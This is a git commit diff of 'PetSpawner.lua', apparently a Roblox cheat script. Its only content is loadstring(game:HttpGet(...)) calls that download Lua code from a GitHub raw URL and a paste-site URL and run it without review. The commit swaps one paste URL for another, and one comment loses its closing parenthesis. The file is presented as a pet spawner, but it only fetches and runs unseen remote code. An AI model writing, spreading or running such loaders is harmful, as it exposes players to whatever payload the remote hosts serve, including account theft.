66cb9eae370f301750cf43cf21031c2c4f8e3c6f
KuniDevLua <profkunin@gmail.com>
2025-07-26 23:17:54 +0800

    Update PetSpawner.lua

--- PetSpawner.lua
+++ PetSpawner.lua
@@ -1,5 +1,5 @@
 -- Load the GAG Visual script (takes a string argument)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))("discord.gg/csxu2nCkw9")
 
--- Load the Mobile Copy script (no arguments needed)
-loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/5VhTzABlhiRxdTTU/raw", true))()
+-- Load the Mobile Copy script (no arguments needed
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/1GLqlWuTKYmkoeay/raw", true))()
